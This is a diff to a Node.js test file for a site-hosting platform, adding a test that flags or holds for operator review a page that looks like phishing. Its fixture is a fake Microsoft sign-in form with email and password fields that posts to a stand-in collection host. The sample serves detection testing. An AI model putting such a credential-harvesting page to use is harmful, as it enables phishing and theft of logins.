@@ -1,8 +1,8 @@
 import assert from "node:assert/strict";
 import { test } from "node:test";
-import { eq } from "drizzle-orm";
+import { eq, sql } from "drizzle-orm";
 import sharp from "sharp";
-import { signUp } from "@/test/db";
+import { plan, signUp } from "@/test/db";
 import { db } from "@/lib/db";
 import { assets, siteDeployments } from "@/lib/db/schema";
 import { ingestBytes } from "@/lib/core/assets";
@@ -181,7 +181,38 @@ test("a build hosted elsewhere is checked the same way, and nothing is stored", 
   assert.match(refused.problems[0], /badge-v1\.png was replaced by badge-v2\.png .*docs\/img\/badge\.png is a copy of it/);
 
   const fine = await checkBuild(ada.caller, files({ "index.html": `<img src="/c/${old.id}">` }));
-  assert.deepEqual(fine, { allowed: true, files: 1, uses: [{ asset: now.id, how: "current", file: "index.html" }], problems: [] });
+  assert.deepEqual(fine, { allowed: true, files: 1, uses: [{ asset: now.id, how: "current", file: "index.html" }], problems: [], flags: [] });
   await assert.rejects(checkBuild(ada.caller, files({ "artbucket.site.json": "{not json" })), /isn't JSON/);
   assert.equal((await usageOf(ada.caller)).used.storage, before);
+});
+
+test("a build that looks like phishing is held where the operator reviews, live with its flags elsewhere, and released by the operator", async () => {
+  const fake = `<title>Sign in</title><h1>Microsoft</h1><form action="https://collect.example/p"><input type="email"><input type="password"></form>`;
+  const newsletter = `<h1>Acme docs</h1><form action="https://list.example/subscribe"><input type="email" name="email"></form>`;
+
+  // Here nobody reviews: it goes live, its flags noted.
+  const open = await createPortal(ada.caller, { name: "Open", slug: `open-${Date.now().toString(36)}`, kind: "landing" });
+  const live = (await deploy(ada.caller, open.id, pack({ "index.html": fake })))!;
+  assert.equal(live.state, "live");
+  assert.deepEqual(live.flags, ["index.html asks for a password, on a page that looks like Microsoft's"]);
+
+  // A new organization on a tier the operator reviews.
+  const eve = await signUp("Sitereview");
+  await plan(eve.caller.project.organizationId, { siteReview: true });
+  const site = await createPortal(eve.caller, { name: "Login", slug: `login-${Date.now().toString(36)}`, kind: "landing" });
+  const held = (await deploy(eve.caller, site.id, pack({ "index.html": fake })))!;
+  assert.equal(held.state, "held");
+  assert.match(held.error!, /^Held for review: index\.html asks for a password, on a page that looks like Microsoft's/);
+  assert.equal(await siteFile(site.slug, {}, "/"), null);
+  // A newsletter form is a brand's site like any other.
+  const docs = await createPortal(eve.caller, { name: "News", slug: `news-${Date.now().toString(36)}`, kind: "docs" });
+  assert.equal((await deploy(eve.caller, docs.id, pack({ "index.html": newsletter })))!.state, "live");
+
+  // The operator releases it, with the statements the guide gives.
+  await db.transaction(async (tx) => {
+    await tx.execute(sql`update site_deployments set state = 'replaced'
+      where state = 'live' and (site_id, path) = (select site_id, path from site_deployments where id = ${held.id} and state = 'held')`);
+    await tx.execute(sql`update site_deployments set state = 'live', error = null where id = ${held.id} and state = 'held'`);
+  });
+  assert.equal((await siteFile(site.slug, {}, "/"))?.status, 200);
 });
